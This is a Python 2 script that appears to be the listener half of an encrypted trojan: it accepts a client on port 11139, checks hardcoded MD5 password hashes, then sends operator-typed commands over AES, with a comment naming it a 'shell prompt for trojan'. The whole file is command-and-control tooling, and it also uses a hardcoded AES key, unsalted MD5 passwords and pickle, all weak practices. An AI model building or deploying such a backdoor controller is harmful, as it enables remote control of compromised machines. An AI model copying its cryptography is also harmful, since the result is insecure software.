import socket
import os
import sys
from Crypto.Cipher import AES
import base64
import pickle
import md5

hash1=md5.new("pass1").hexdigest()
hash2=md5.new("lol123").hexdigest()
passwords_file = {"rajat": hash1, "rimal": hash2}
pickle.dump( passwords_file, open( "passwords_file.p", "wb" ) )
passwords = pickle.load( open( "passwords_file.p", "rb" ) )

################ AES algorithm variables and padding ##########################
BLOCK_SIZE = 32 #define AES block size 
PADDING = '{'  #padding character to be used for enc/dec
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING #pad the text to be encrypted with sufficient number of '{' chars

#encrypt/encode and decrypt/decode the string
#AES for encryption/decryption and base64 for encode/decode
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s))) #first encrypt then encode
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING) #first decode then decrypt

secret = 32*'a' #secret key
cipher=AES.new(secret)  #creating an AES cipher object
###############################################################################

c=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #creating a server socket object
c.bind(('0.0.0.0', 11139)) #binding socket to port 443
c.listen(1) # listening for client

while(1):

	s,a = c.accept() #accepting a client in s(here s = client 	socket and a = client address)


	test=s.recv(1024)
	msg="enter uname:passwd"
	encrypted=EncodeAES(cipher,msg)
	s.send(encrypted)
	credentials_enc=s.recv(1024)
	uname_pass = DecodeAES(cipher, credentials_enc)#decode the data recvd
	
	array = uname_pass.split(":")
	uname=array[0]
	password=array[1]
	password=md5.new(password).hexdigest()
	flag=False


	if(uname in passwords):
		
		if(passwords[uname]==password):
			flag=True
			nextcmd="Authenticated!"
			
		else:
		
			nextcmd="Incorrect Password"	
	else:
		nextcmd="Incorrect Username"

	encrypted=EncodeAES(cipher,nextcmd)
	s.send(encrypted)
	if flag==True:
		break;
		

while True:
	data = s.recv(2048) #recv 2048 bytes(encrypted) form client
	print ("Encrypted data recvd : " + data) 
	decoded = DecodeAES(cipher, data)#decode the data recvd
	print ("Decrypted data : "+ decoded)
	
	if decoded=="bye":# break condition: if user enters bye the loop gets terminated!
		break
	
	nextcmd = raw_input("enter message : ") #shell prompt for trojan
	encrypted=EncodeAES(cipher,nextcmd)#encrypt the command and send
	s.send(encrypted)
s.close()#close the client socket
c.close()#close the server socket
